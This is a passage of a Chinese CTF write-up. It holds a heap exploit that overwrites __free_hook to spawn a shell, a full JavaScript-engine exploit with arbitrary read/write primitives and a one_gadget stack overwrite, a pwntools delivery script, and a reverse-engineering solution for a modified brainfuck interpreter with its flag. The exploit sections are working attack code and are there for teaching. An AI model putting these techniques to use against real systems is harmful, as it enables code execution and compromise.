0x55c8211d80c0:        0x000055c821adc360        0x00000000000000f0 #6
0x55c8211d80d0:        0x000055c821adc260        0x00000000000000f0 #7
0x55c8211d80e0:        0x000055c821adca60        0x0000000000000178 #8
0x55c8211d80f0:        0x0000000000000000        0x0000000000000178
'''
add1(0xf0)
'''
pwndbg> x/10gx 0x202060+ 0x5573ee629000
0x5573ee82b060:        0x00005573eefd7960        0x00000000000000f0 #0
0x5573ee82b070:        0x00005573eefd7860        0x00000000000000f0
0x5573ee82b080:        0x00005573eefd7760        0x00000000000000f0
0x5573ee82b090:        0x00005573eefd7660        0x00000000000000f0
0x5573ee82b0a0:        0x00005573eefd7560        0x00000000000000f0
0x5573ee82b0b0:        0x00005573eefd7460        0x00000000000000f0 #5
0x5573ee82b0c0:        0x00005573eefd7360        0x00000000000000f0 #6
0x5573ee82b0d0:        0x00005573eefd7260        0x00000000000000f0 #7
0x5573ee82b0e0:        0x00005573eefd7a60        0x0000000000000178 #8
0x5573ee82b0f0:        0x00005573eefd7360        0x00000000000000f0 #9
'''


# delete(6) # 6==9
# #gdb.attach(p)
# edit(9,p64(free_hook-0x10))
# add1(0xf0) # 6
# add1(0xf0) # 10
# #add1(0xf0)

# #gdb.attach(p)
# edit(10,"/bin/sh\x00"*2+p64(libc_base+libc.sym['system']))
# edit(6,"/bin/sh\x00"*2)
# delete(6)

delete(6) # 6==9
#gdb.attach(p)
edit(9,p64(free_hook-0x8))
add1(0xf0) # 6
add1(0xf0) # 10  freehook chunk
#add1(0xf0)

#gdb.attach(p)
edit(10,"/bin/sh\x00"+p64(libc_base+libc.sym['system']))

delete(10)
p.interactive()
```
## 出题思路
1. offbynull、chunk大小固定/不固定，保护全开；环境libc-2.27
# Pwn -> HelloJerry
这道题只放出exp，详情参考官方WP
```js
function printhex(s,u){
    print(s,"0x" + u[1].toString(16).padStart(8, '0') + u[0].toString(16).padStart(8, '0'));
}

function hex(i){
    return "0x" + i.toString(16).padStart(16, '0');
}

function pack64(u){
    return u[0] + u[1] * 0x100000000;
}

function l32(data){
    let result = 0;
    for(let i=0;i<4;i++){
        result <<= 8;
        result |= data & 0xff;
        data >>= 8;
    }
    return result;
}

a = [1.1];
a.shift();

var ab = new ArrayBuffer(0x1337);
var dv = new DataView(ab);

var ab2 = new ArrayBuffer(0x2338);
var dv2 = new DataView(ab2);
for(let i = 0; i < 0x90; i++){
	dv2 = new DataView(ab2);
}

a[0x193] = 0xffff;

print("[+]change ab range");

a[0x32] = 0xdead;

for(let i = 0; i < 100000000; i ++){

}

var idx = 0;
for (let i = 0; i < 0x5000; i++){
    let v = dv.getUint32(i, 1);
    if(v == 0x2338){
        idx = i;
    }
}

print("Get idx!");

function arb_read(addr){
    dv.setUint32(idx + 4, l32(addr[0]));
    dv.setUint32(idx + 8, l32(addr[1]));
    let result = new Uint32Array(2);
    result[0] = dv2.getUint32(0, 1)
    result[1] = dv2.getUint32(4, 1);
    return result;
}

function arb_write(addr,val){
    dv.setUint32(idx + 4, l32(addr[0]));
    dv.setUint32(idx + 8, l32(addr[1]));
    dv2.setUint32(0, l32(val[0]));
    dv2.setUint32(4, l32(val[1]));
}

var u = new Uint32Array(2);
u[0] = dv.getUint32(idx + 4, 1);
u[1] = dv.getUint32(idx + 8, 1);

print(hex(pack64(u)));

var elf_base = new Uint32Array(2);
elf_base[0] = u[0] - 0x6f5e0;
elf_base[1] = u[1];
printhex("elf_base:",elf_base);

var free_got = new Uint32Array(2);
free_got[0] = elf_base[0] + 0x6bdd0;
free_got[1] = elf_base[1];
printhex("free_got:",free_got);

var libc_base = arb_read(free_got);
libc_base[0] -= 0x9d850;
printhex("libc_base:",libc_base);

var environ_addr = new Uint32Array(2);
environ_addr[0] = libc_base[0] + 0x1ef2d0;
environ_addr[1] = libc_base[1];
printhex("environ_addr:",environ_addr);
var stack_addr = arb_read(environ_addr);
printhex("stack_addr:",stack_addr);

var one_gadget = new Uint32Array(2);
one_gadget[0] = (libc_base[0] + 0xe6c7e);
one_gadget[1] = libc_base[1];
printhex("one_gadget:",one_gadget);
stack_addr[0] -= 0x118;
arb_write(stack_addr,one_gadget);

var zero = new Uint32Array(2);
zero[0] = 0;
zero[1] = 0;
printhex("zero:",zero);
stack_addr[0] -= 0x29;
arb_write(stack_addr,zero);

print("finish");

for(let i = 0; i < 100000000; i ++){

}
```
```python
#!/usr/bin/env python
import string
from pwn import *
from hashlib import sha256
context.log_level = "debug"

dic = string.ascii_letters + string.digits

DEBUG = 0

def solvePow(prefix,h):
    for a1 in dic:
        for a2 in dic:
            for a3 in dic:
                for a4 in dic:
                    x = a1 + a2 + a3 + a4
                    proof = x + prefix.decode("utf-8")
                    _hexdigest = sha256(proof.encode()).hexdigest()
                    if _hexdigest == h.decode("utf-8"):
                            return x

r = remote("127.0.0.1",9998)

r.recvuntil("sha256(XXXX+")
prefix = r.recvuntil(") == ", drop = True)
h = r.recvuntil("\n", drop = True)
result = solvePow(prefix,h)
r.sendlineafter("Give me XXXX:",result)

data = open("./exp.js","r").read()
data = data.split("\n")
for i in data:
    if i == "":
        continue
    r.sendlineafter("code> ",i)
r.sendlineafter("code> ","EOF")

r.interactive()

```
# Reverse -> Press
linux下的逆向题目，通过题目附件和ida简单分析可以得到这个是一个简单的类似brainfuck的代码解释器，出题人新加了`*`,核心原理就是对一个数组dataptr的操作，魔改的brainfuck的操作码如下：
| `>`  | ++ data_ptr                                                  |
| ---- | ------------------------------------------------------------ |
| `<`  | -- data_ptr                                                  |
| `+`  | ++ *data_ptr                                                 |
| `-`  | -- *data_ptr                                                 |
| `.`  | putchar(*data_ptr)                                           |
| `,`  | *data_ptr = get_char()                                       |
| `[`  | if (*data_ptr != 0) execute next instruction. <br />else jump to '[' |
| `]`  | 和`]` 相反                                                   |
| `*`  | *data_ptr *= *data_ptr+1                                     |

首先程序标记了brainfuck中`[`、`]`的位置存在mark数组中：
```c
unsigned __int64 sub_4007B6()
{
  int v1; // [rsp+8h] [rbp-48h]
  int i; // [rsp+Ch] [rbp-44h]
  char src[56]; // [rsp+10h] [rbp-40h] BYREF
  unsigned __int64 v4; // [rsp+48h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  memset(bytes1, 0, sizeof(bytes1));
  memset(s, 0, sizeof(s));
  memset(flag, 0, sizeof(flag));
  memset(output, 0, 0xC8uLL);
  idx = 0;
  dword_6020A0 = 0;
  dword_602268 = 0;
  dword_602680 = 0;
  strcpy(src, "++++++++++[->++++++++++++++++<],[->-<]>>[-]+++++<*++.<");
  strcpy(s, src);
  v1 = 0;
  for ( i = 0; i <= 199; ++i )
  {
    if ( s[i] == '[' )
    {
      mark[i] = ++v1;
    }
    else if ( s[i] == ']' )
    {
      mark[i] = v1--;
    }
    else
    {
      mark[i] = 0;
    }
  }
  return __readfsqword(0x28u) ^ v4;
}
```
然后读取flag文件，之后进入关键函数对brainfuck代码进行解释：如下：
```c
__int64 sub_40094B()
{
  int i; // [rsp+0h] [rbp-8h]
  int j; // [rsp+4h] [rbp-4h]

  switch ( s[dword_6020A0] ) //++++++++++[->++++++++++++++++<],[->-<]>>[-]+++++<*++.<
  {
    case '>':
      ++idx;
      break;
    case '<':
      --idx;
      break;
    case '+':
      ++dataptr[idx];
      break;
    case '-':
      --dataptr[idx];
      break;
    case '*':
      dataptr[idx] *= dataptr[idx + 1];
      break;
    case '.':
      output[dword_602268++] = dataptr[idx];
      break;
    case ',':
      dataptr[idx] = flag[dword_602680++];
      break;
    case '[':
      if ( !dataptr[idx] )
      {
        for ( i = 1; mark[dword_6020A0 + i] != mark[dword_6020A0]; ++i )
          ;
        dword_6020A0 += i;
      }
      break;
    case ']':
      for ( j = -1; mark[dword_6020A0 + j] != mark[dword_6020A0]; --j )
        ;
      dword_6020A0 = dword_6020A0 + j - 1;
      break;
  }
  return (unsigned int)++dword_6020A0;
}
```
这里，`++++++++++[->++++++++++++++++<],[->-<]>>[-]+++++<*++.<`的含义大概是：
```
++++++++++                          # 10                      dataptr[0] = 10
[
  ->++++++++++++++++<               # 循环10 16次  10*16=160   dataptr[0] = 10  dataptr[1] += 16  return dataptr[0] = 0 ,dataptr[1] = 160
]
,                                   # 取flag一个字节           dataptr[0] = flag[i]
[ 
  ->-<                              # 160 - flag[i]           dataptr[0] - 1   dataptr[1] - 1    return dataptr[0] = 0,dataptr[1] = 160 - dataptr[0]
]
>>                                  # dataptr[2]
[
  -                                 # dataptr[2] = 0
]
+++++<*                             # dataptr[2] = 5    dataptr[1]*=dataptr[2]  <=> (160 - flag[i])*5    return dateptr[1]
++                                  # (160 - flag[i])*5 + 2
.                                   # out = (160 - flag[i])*5 + 2
<                                   # dataptr[0]
```
逻辑为初始dataptr[0]+=0xa0,(dataptr[0]-flag[i])*5+2, dataptr[0] = dataptr[1]后面flag每个字节按照这个操作，所以根据out的字节进行爆破即可：
```python
import base64
s = ''
with open('./out.back','rb') as f:
	list1 = f.read()
for i in list1:
	print hex(ord(i)),

print 
d=0
for j in list1:	
	d+=0xa0
	d=d & 0xff
	for i in range(128):
		if ((d-i)*5+2)&0xff == ord(j):
			s+=chr(i)
			d=((d-i)*5+2)&0xff
			break
			
print base64.b64decode(s) 
'''
0x60 0xe1 0x2f 0x5 0x79 0x80 0x5e 0xe1 0xc5 0x57 0x8b 0xcc 0x5c 0x9a 0x67 0x26 0x1e 0x19 0xaf 0x93 0x3f 0x9 0xe2 0x97 0x99 0x7b 0x86 0xc1 0x25 0x87 0xd6 0xc 0xdd 0xcf 0x2a 0xf5 0x65 0xe 0x73 0x59 0x1d 0x5f 0xa4 0xf4 0x65 0x68 0xd1 0x3d 0xd2 0x98 0x5d 0xfe 0x5b 0xef 0x5b 0xcc
flag{de0bd67e-6d25-87d7-1876-ad131a6165cb}
'''
```
## 总结
这个是brainfuck语言拓展的题目，魔改的brainfuck，加深了对brainfuck语言的了解。
## 出题思路
1. 魔改brainfuck。

# 参考
1. [官方WP](https://mp.weixin.qq.com/s/1V5BEsfdZNRKwWP1mCs8wQ)
2. [pwnner WP](https://mp.weixin.qq.com/s/G7rDFqSb4H2HKnr0eFToJQ)
3. [pwnner1 WP](https://mp.weixin.qq.com/s/F-1dLFlPWi2bChvif_Ao0w)
# 附件
[题目附件](https://github.com/1094093288/IMG/tree/master/Pwn/2021Sangfor)